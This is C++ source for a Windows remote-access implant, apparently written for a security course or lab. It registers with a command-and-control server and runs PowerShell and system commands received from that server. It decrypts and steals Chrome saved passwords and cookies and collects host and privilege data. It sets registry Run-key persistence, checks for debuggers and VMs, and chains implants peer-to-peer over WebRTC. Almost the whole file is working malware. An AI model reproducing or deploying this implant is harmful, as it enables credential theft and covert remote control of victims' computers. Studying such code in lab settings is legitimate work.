#include "comms/comms.hpp"
#include "config/config.hpp"
#include "crypto/aesgcm.hpp"
#include "execution/execution.hpp"
#include "file_io/file_io.h"
#include "libs/nlohmann/json.hpp"
#include "loot/loot.hpp"
#include "sitawareness/sitawareness.hpp"
#include <iostream>
#include <shlwapi.h>
#include <string>

#include "libs/libdatachannel/include/rtc/rtc.hpp"

#include <algorithm>
#include <atomic>
#include <chrono>
#include <future>
#include <iomanip>
#include <iostream>
#include <memory>
#include <random>
#include <stdexcept>
#include <thread>
#include <unordered_map>

#ifdef CHILD
bool isChild = true;
#else
bool isChild = false;
#endif

using json = nlohmann::json;

std::string get_mac_address() {
    std::string mac_address =
        "wmic path Win32_NetworkAdapter where \"PNPDeviceID like \'%PCI%\' AND "
        "AdapterTypeID=\'0\'\" get MacAddress";
    LPSTR mac = const_cast<char *>(mac_address.c_str());

    std::string mac_id = runProgram(mac);
    std::istringstream ss(mac_id);
    std::string id;
    ss >> id;
    ss >> id;
    // std::cout << id << std::endl;
    return id;
}

std::string get_privilege_info() {
    std::string cmd = "whoami /all";
    LPSTR priv = const_cast<char *>(cmd.c_str());

    std::string priv_info = runProgram(priv);
    return priv_info;
}

void make_persist() {
    std::string p = "Split-Path -Path $pwd -Parent";
    LPSTR pa = const_cast<char *>(p.c_str());
    std::istringstream res(runPowershellCommand(pa));
    std::string resp;
    res >> resp;
    resp = resp + "\\main_implant.exe";
    // std::cout << resp << std::endl;
    LPCSTR progPath = resp.c_str();
    HKEY hkey = NULL;
    LPCSTR path = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run";

    LONG createStatus =
        RegCreateKey(HKEY_CURRENT_USER, path, &hkey); // Creates a key
    LPCSTR name = "MyApp";
    LONG status = RegSetValueEx(hkey, name, 0, REG_SZ, (BYTE *)progPath,
                                100 * sizeof(char));
    if (status == ERROR_SUCCESS) {
        std::cout << "Done" << std::endl;
    }
}

void check_debugger() {
    if (IsDebuggerPresent()) {
        int *ptr;
        ptr = NULL;
        *ptr = 0;
    }
}

int check_ch0nky() {
    char fileName[] = "C:\\malware\\ch0nky.txt"; // TODO: Make sure this file
                                                 // exists to perform this test
    BOOL fileExists = FALSE;
    fileExists = PathFileExistsA(fileName);
    if (fileExists) {
        return 1;
    }
    exit(1);
}

std::string handleCommand(json command) {
    std::string cmd_result = "";
    std::string cmd_text = "";
    std::string cmd_id = command["command_id"];
    if (cmd_id != "-1") {
        cmd_text = command["command_text"];
        LPSTR cmd = const_cast<char *>(cmd_text.c_str());
        try {
            if (command["command_type"] == "shell") {
                cmd_result = runPowershellCommand(cmd);
            } else if (command["command_type"] == "implant_cmd") {
                std::string cmd_usr = "$env:UserName";
                LPSTR username_cmd = const_cast<char *>(cmd_usr.c_str());
                std::string username = runPowershellCommand(username_cmd);
                if (command["command_text"] == "chrome_passwords") {
                    unsigned char *masterKey =
                        new unsigned char[MASTER_KEY_SIZE];

                    getMasterKey(masterKey, "vagrant");
                    printUCharAsHex(masterKey, MASTER_KEY_SIZE);

                    json jsonResult = lootChromePasswords(
                        (const unsigned char *)masterKey, username);
                    cmd_result = jsonResult.dump();
                    // std::cout << "jsonResult: " << jsonResult.dump(4) <<
                    // std::endl;

                    delete[] masterKey;
                } else if (command["command_text"] == "situational_awareness") {
                    cmd_result = getInfo();
                    // std::cout << info << std::endl;
                } else if (command["command_text"] == "chrome_cookies") {
                    unsigned char *masterKey =
                        new unsigned char[MASTER_KEY_SIZE];

                    getMasterKey(masterKey, "vagrant");
                    printUCharAsHex(masterKey, MASTER_KEY_SIZE);

                    json jsonResult = lootChromeCookies(
                        (const unsigned char *)masterKey, username);
                    cmd_result = jsonResult.dump();
                    // std::cout << "jsonResult: " << jsonResult.dump(4) <<
                    // std::endl;

                    delete[] masterKey;
                }
            } else if (command["command_type"] == "system_program") {
                cmd_result = runProgram(cmd);
            }
        } catch (const std::exception &e) {
            cmd_result = e.what();
        }
        if (cmd_result == "") {
            cmd_result = "Probably wrong command type or command text";
        }
        // return cmd_result;
    }
    return cmd_result;
}

int main() {
    std::string get_cmd_resp;
    CONFIG config;
    config.computer_guid = get_mac_address();
    config.c2_fqdn = "localhost";
    config.c2_port = 5000;
    // bool isChild = false;
    // bool isChild = true;
    std::string parentWsUrl = "ws://localhost:5001/";
    rtc::InitLogger(rtc::LogLevel::Warning);

    rtc::Configuration rtcconfig;
    // rtcconfig.iceServers.emplace_back("stun.l.google.com:19302");

    auto pc = std::make_shared<rtc::PeerConnection>(rtcconfig);
    std::shared_ptr<std::string> localDescription;
    std::shared_ptr<std::string> localCandidate;
    pc->onLocalDescription([localDescription](rtc::Description description) {
        std::cout << "Local Description (Paste this to the other peer):"
                  << std::endl;
        std::cout << std::string(description) << std::endl;
        localDescription->assign(std::string(description));
    });
    pc->onLocalCandidate([localCandidate](rtc::Candidate candidate) {
        std::cout << "Local Candidate (Paste this to the other peer after "
                     "the local description):"
                  << std::endl;
        std::cout << std::string(candidate) << std::endl << std::endl;
        localCandidate->assign(std::string(candidate));
    });

    std::shared_ptr<rtc::DataChannel> dc;

    if (isChild) { // we are the child
        // we create the data channel
        dc = pc->createDataChannel("test");
        std::cout << "child created dc" << std::endl;
        dc->onMessage([dc](auto data) {
            // this is a child and it has received a message
            if (std::holds_alternative<std::string>(data)) {
                std::cout << "[Received: " << std::get<std::string>(data) << "]"
                          << std::endl;
                json j = json::parse(std::get<std::string>(data));
                std::string mode = j["mode"];
                // if this is in response to querying the next command:
                if (mode == "new_command") {
                    std::string get_cmd_resp = j["data"];
                    json command = json::parse(get_cmd_resp);
                    std::string cmd_result = "";
                    std::string cmd_text = "";
                    std::string cmd_id = command["command_id"];
                    cmd_result = handleCommand(command);
                    // send back result to parent
                    json sendBackCommand = json::parse("{}");
                    sendBackCommand["mode"] = "command_result";
                    sendBackCommand["data"] = cmd_result;
                    sendBackCommand["computer_guid"] = j["computer_guid"];
                    sendBackCommand["cmd_id"] = cmd_id;
                    dc->send(sendBackCommand.dump());
                }
                // if this is in response to posting a result:
                if (mode == "after_post") {
                    std::cout << "child got result after post " << j.dump()
                              << std::endl;
                }
            }
        });

        // we also initiate contact with the parent over websocket for signalling
        auto ws = std::make_shared<rtc::WebSocket>();
        std::cout << "child created ws" << std::endl;
        ws->onMessage([ws, pc, localDescription, localCandidate](auto data) {
            // data holds either std::string or rtc::binary
            if (!std::holds_alternative<std::string>(data))
                return;

            json message = json::parse(std::get<std::string>(data));
            std::string mode = message["mode"];
            std::string peerData = message["data"];

            // we are the child, and when we get a description we send back a candidate
            if (mode == "description") {
                pc->setRemoteDescription(peerData); // this is fine taking a string
                //std::string localCandidate = 
                Sleep(100); // just in case localCandidate hasn't been set yet
                json childCandidateInfo = json::parse("{}");
                childCandidateInfo["mode"] = "candidate";
                childCandidateInfo["data"] = *localCandidate;
                ws->send(childCandidateInfo.dump());
            }

            // we are the child, and when we get a candidate we just set it and don't send anything back
            if (mode == "candidate") {
                pc->addRemoteCandidate(peerData);
            }

        });
        std::cout << "here!" << std::endl;
        ws->onOpen([](){
            std::cout << "ws opened" << std::endl;
        });
        ws->onError([](std::string s){
            std::cout << "websocket error " << s << std::endl;
        });
        json childDescription = json::parse("{}");
        childDescription["mode"] = "description";
        // childDescription["data"] = *localDescription;
        std::cout << "before opening ws" << std::endl;
        ws->open(parentWsUrl);
        std::cout << "child called open ws" << std::endl;
        Sleep(2000); // i know i know, just wait for the ws to open
        // ws->send(childDescription.dump());
        ws->send("literally anything");
        std::cout << "child sent description" << std::endl;

    } else { // we are the parent
        // we receive the datachannel created by the child
        pc->onDataChannel([&dc](std::shared_ptr<rtc::DataChannel> incoming) {
            dc = incoming;
            // dc->send("Hello world!");
            dc->onMessage([dc](auto data){
                // child sends stuff to us
                if (std::holds_alternative<std::string>(data)) {
                    std::cout << "[Received: " << std::get<std::string>(data) << "]"
                          << std::endl;
                    json j = json::parse(std::get<std::string>(data));
                    std::string mode = j["mode"];
                    std::string child_guid = j["computer_guid"];
                    CONFIG child_config;
                    child_config.computer_guid = child_guid;
                    child_config.c2_fqdn = "localhost";
                    child_config.c2_port = 5000;
                    // if the child wants its next command
                    if (mode == "get_command") {
                        // get the command for it
                        std::string command_for_child = getNextCommand(child_config);
                        // send its command to it
                        json return_command = json::parse("{}");
                        return_command["mode"] = "new_command";
                        return_command["data"] = command_for_child;
                        return_command["computer_guid"] = child_guid;
                        dc->send(return_command.dump());
                    }
                    // if the child wants to send the result of its command
                    if (mode == "command_result") {
                        std::string child_result = j["data"];
                        std::string child_cmd_id = j["cmd_id"];
                        sendCommandResult(child_config, child_cmd_id, child_result);
                        // don't bother to send the response from sendCommandResult back to child
                    }
                }
            });
        });

        // we also listen on a websocket for the child's signalling connection
        struct rtc::WebSocketServer::Configuration wss_config; // = rtc::Configuration 
        wss_config.port = 5001;
        wss_config.enableTls = false;
        // auto ws = std::make_shared<rtc::WebSocket>();
        std::shared_ptr<rtc::WebSocket> ws;
        auto wss = std::make_shared<rtc::WebSocketServer>(wss_config);
        std::cout << "parent made wss" << std::endl;
        wss->onClient([&ws, pc, localDescription, localCandidate](auto ws_found){
            std::cout << "parent got client" << std::endl;
            ws = ws_found;
            ws->onMessage([ws, pc, localDescription, localCandidate](auto data){
                // data holds either std::string or rtc::binary
                if (!std::holds_alternative<std::string>(data))
                    return;

                json message = json::parse(std::get<std::string>(data));
                std::string mode = message["mode"];
                std::string peerData = message["data"];

                // if a child is contacting us for the first time with its description
                if (mode == "description") {
                    pc->setRemoteDescription(peerData); // this is fine taking a string
                    Sleep(100); // just in case localDescription hasn't been set yet
                    // now we need to send our description to the child
                    json parentDescription = json::parse("{}");
                    parentDescription["mode"] = "description";
                    parentDescription["data"] = *localDescription;
                    ws->send(parentDescription.dump());
                }

                // if the child is sending us their candidate information
                if (mode == "candidate") {
                    pc->addRemoteCandidate(peerData);
                    Sleep(100); // just in case localCandidate hasn't been set yet
                    // now we need to send our candidate info to the child
                    json parentCandidate = json::parse("{}");
                    parentCandidate["mode"] = "candidate";
                    parentCandidate["data"] = *localCandidate;
                    ws->send(parentCandidate.dump());
                }
            });
        });

    }

    // MessageBoxA(NULL,NULL,NULL,MB_YESNO);
    Sleep(100);
    // check_ch0nky();
    std::string cmd_usr = "$env:UserName";
    LPSTR username_cmd = const_cast<char *>(cmd_usr.c_str());
    std::string username = runPowershellCommand(username_cmd);
    std::cout << username << std::endl;
    // make_persist();
    // check_debugger();

    // exit(1);

    std::string info = getInfo();
    // std::cout << info << std::endl;
    // if(System.Diagnostics.Debugger.IsAttached){

    // }
    json j = json::parse(info);
    // std::cout << j["systeminfo"] << std::endl;


    std::string sys = j["systeminfo"];
    json sys_info = json::parse(sys);
    // check VM
    if (sys_info["Hyper-V Requirements"] !=
        "A hypervisor has been detected. Features required for Hyper-V "
        "will "
        "not "
        "be displayed.") {
        exit(1);
    }
    json reg;
    // reg["computer_guid"] = config.computer_guid;
    // std::cout << sys_info["Network Card(s)"] << std::endl;

    // std::cout <<  sys_info["Network Card(s)"] << std::endl;
    reg["computer_guid"] = config.computer_guid;
    reg["computer_name"] = sys_info["Host Name"];
    reg["computer_user"] = j["whoami"];
    reg["computer_privileges"] = get_privilege_info();
    reg["connecting_ip_address"] = sys_info["Network Card(s)"];
    reg["session_key"] = "askdgjassgf";

    std::cout << post(config.c2_fqdn, config.c2_port, "/register", reg.dump())
              << std::endl;

    while (true) {
        Sleep(1000);
        // std::cout << "new loop" << std::endl;
        std::string get_cmd_resp = "{\"command_id\": \"-1\"}";
        if (!isChild) {
            get_cmd_resp = getNextCommand(config);
        } else {
            json messageForParent = json::parse("{}");  
            messageForParent["computer_guid"] = config.computer_guid;
            messageForParent["mode"] = "get_command";
            dc->send(messageForParent.dump()); // we will get the result in the dc->onMessage callback
            std::cout << "child sent request to parent" << std::endl;
        }
        //get_cmd_resp = getNextCommand(config);
        //std::cout << "get_cmd_resp: "<< get_cmd_resp << std::endl;
        json command = json::parse(get_cmd_resp);
        std::string cmd_result = "";
        std::string cmd_text = "";
        std::string cmd_id = command["command_id"];
        if (cmd_id != "-1") {
            cmd_result = handleCommand(command);
        }
        if (!isChild && (cmd_id != "-1")) {
            std::cout << sendCommandResult(config, cmd_id, cmd_result)
                      << std::endl;
        }
    }

    return 0;
}